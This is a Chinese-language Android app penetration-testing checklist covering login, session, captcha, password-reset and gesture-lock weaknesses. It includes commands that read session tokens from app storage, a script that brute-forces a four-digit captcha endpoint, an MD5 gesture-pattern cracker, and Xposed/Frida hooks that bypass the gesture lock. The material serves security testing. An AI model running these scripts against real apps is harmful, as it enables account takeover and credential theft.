# 04 认证/会话策略 + 手势密码

源：Android APP渗透测试方法大全 §6 / §7

---

## 4.1 安全策略设置（逐项测试清单）

| 项 | 测试步骤 | 判据 |
|---|---|---|
| 密码复杂度 | 设置时试 `123456 / 654321 / abc123 / aaaaaa / 11223344`；反编译搜口令校验方法（提示文案定位） | 无检测=中；有但不含长度/字符类型/不可重复=低 |
| 账号登录限制 | 同一账号从未授权设备登录 | 允许 = 高 |
| 账户锁定 | 连续错 N 次（实测 5/10 次） | 无锁定/无延时 = 高（配弱口令即爆破） |
| 私密问题验证 | 改单次支付限额/查看完整卡号是否要求私密问题；**答案是否唯一对应**（补问题但不重验旧答案） | 中 |
| 会话安全设置 | App 挂后台 20 分钟（可调 30s/5min 逐档）后操作 | 不重新鉴权 = 高 |
| 界面切换保护 | ①登录/转账页填好账号密码→切出→切回，看是否清空 ②登录后切出 5 分钟是否自动退出 | 不清空=中；不退出=高 |
| UI 信息泄露 | 不存在用户名 vs 存在用户名+错密码，两次提示是否不同（用户名枚举）；卡号/身份证/手机号是否遮挡（含列表页/详情页/截图） | 中 |
| 安全退出 | `adb logcat`/代理记下 session token/JSESSIONID → 客户端登出 → 用旧 token 重发业务请求 | 服务端未销毁会话 = 高 |
| 密码修改验证 | 改密时故意填错误旧密码 | 不校验 = 高 |
| Activity 界面劫持 | 装 `HijackActivity.apk`，在工具里指定目标进程名（先 `ps`/`top` 找），点 OK → 打开被测应用，工具尝试用自己窗口覆盖 | 覆盖成功且无任何警告 = 中 |

### 会话/登出验证命令
```bash
# 抓下 cookie / token
adb shell "cat /data/data/<pkg>/shared_prefs/*.xml" | grep -iE 'token|session|cookie'
# 客户端点登出后，用旧凭据直接打业务接口
curl -s -X POST 'https://api.target/xxx' -H 'Cookie: JSESSIONID=<旧值>' -d '...'
# 平台侧建议用 fs 后再启：adb shell am force-stop <pkg>
```

---

## 4.2 验证码安全

### ① 识别（客户端图形码）
- 观察组成：位数/字符集/有无干扰线/是否变形。简单者用 `PKAVHttpFuzzer` 或 ddddocr 识别
- 自己放大 6~10x 读图 + 用报错文案自校验（不写 OCR，见用户偏好）

### ② **关键：验证码校验接口是否可枚举暴破**
若验证码验证形式是 `https://xxx/web/inc/CRrand.jsp?rand=xxxx` 这种回显式接口，则可直接穷举：
```python
# coding=utf-8
import requests
s = requests.Session()
url_1 = 'https://xxx.com/web/login.jsp'
s.get(url_1, verify=False)
for number in range(10000):
    url_2 = 'https://xxx.com/web/inc/CRrand.jsp?rand=' + str(number).zfill(4)
    s.cookies.set('JSESSIONID', '<登录后拿到的>', path='/web/', domain='xxx.com')
    req = s.get(url_2, verify=False)
    print('[*] Trying: ' + str(number).zfill(4) + ' Return: ' + req.text.strip())
    if '1' in req.text:            # 回显 1 = 验证通过
        print('[+] The code is: ' + str(number))
        break
```
判据：**服务端无限次校验 + 码空间小（4~6 位）** = 高（配弱口即完整账户接管）。即使验证码本身复杂，只要校验接口可无限枚举，该接口仍为高危。
配套：验证码**未与手机号/会话绑定**、可重复使用、下发接口无频率限制（短信轰炸）都是本项子项。

---

## 4.3 密码修改与重置链

1. 改密时不填旧密码 / 填错旧密码 → 直接改成功 = 高
2. 忘记密码流程：重置凭证是否回显在响应里、是否可枚举、是否与手机号绑定 → 接 `reset-token-disclosure-ato`
3. 修改后：旧 token 是否失效；是否给用户发通知（无通知 = 隐蔽接管）

---

## 4.4 手势密码（五查 + 绕过）

| 项 | 测试法 | 判据 |
|---|---|---|
| 复杂度 | 设置时输入 2~3 点，看是否有"至少连接 4 个点"提示 | 无最少点位判断 = 中（提示文案可快速定位代码） |
| 修改/取消 | 改/取消手势时是否要求**原手势或普通密码**；重点试：① 走"忘记手势密码"流程 ② 业务跳转能回到手势设置页时能否直接改删 ③ 重装/清数据后是否仍需原手势 | 可免旧手势改删 = 高 |
| 本地保存 | `grep -ri 'gesture\|pattern\|lock' /data/data/<pkg>/`；看明文还是散列 | 明文=高；**MD5/SHA1 单次散列也算不安全**：①碰撞 ②`somd5.com` 等查表 |
| 锁定策略 | 连续错 N 次：登录态下是否退出登录并关闭客户端；未登录态是否关闭客户端并锁定输入一定时间 | 无锁定 = 高（手势空间仅 `9! = 362880`，可穷举） |
| **抗绕过** | 装 Xposed + `SwipeBack` 插件 → 进手势密码输入页 → **侧滑关闭该页** → 看能否直接进入登录后页面 | 能滑走 = 高（UI 层锁，非业务层鉴权） |

### 散列算法反推（位数对照表）
| 算法 | 二进制位 | hex 位数 |
|---|---|---|
| MD5 | 128 | 32（或 16 位截断） |
| SHA-1 | 160 | 40 |
| SHA-256 | 256 | 64 |
存下来的字符串位数对应上哪个，就去 jar 里 grep 对应算法 → 快速定位代码。

### 手势密码数据形态
- 本地：3×3 二维数组 `a[2][2]`
- 与服务器交互：转一维 `b[8]`（像手机数字键盘 1-9 顺序）后再处理
- 爆破脚本里要按**手机数字键盘映射**转，不是 0-8 索引（这是最常见的写错点）

### 离线穷举模板
```python
import hashlib, itertools
# 1..9 抽取 4~9 个点，不重复；按数字键盘序拼接
for n in range(4, 10):
    for perm in itertools.permutations('123456789', n):
        s = ''.join(perm)
        if hashlib.md5(s.encode()).hexdigest() == '<从本地拿到的散列>':
            print('FOUND', s); raise SystemExit
```
空间量级：4 点 = 3024，6 点 = 60480，9 点 = 362880 —— 单机秒级。**所以"手势密码 = 凭证"这个设计本身必须配严格锁定策略才能成立。**

### Xposed 侧滑绕过脚本骨架（自编译插件）
```java
// 在目标 App 的手势 Activity 上 hook：把验证结果直接置为通过，
// 或用 SwipeBack 类插件提供的 finish() 钩子把手势页 finish 掉返回上层
XposedHelpers.findAndHookMethod("<pkg>.GestureActivity", lpparam.classLoader,
        "onCreate", Bundle.class, new XC_MethodHook() {
    @Override protected void afterHookedMethod(MethodHookParam p) {
        // 直接 startActivity 到登录后主页
    }
});
```
现代替代：`frida -U -f <pkg> -l gesture_bypass.js`，hook `setResult`/`finish`/校验函数返回值。
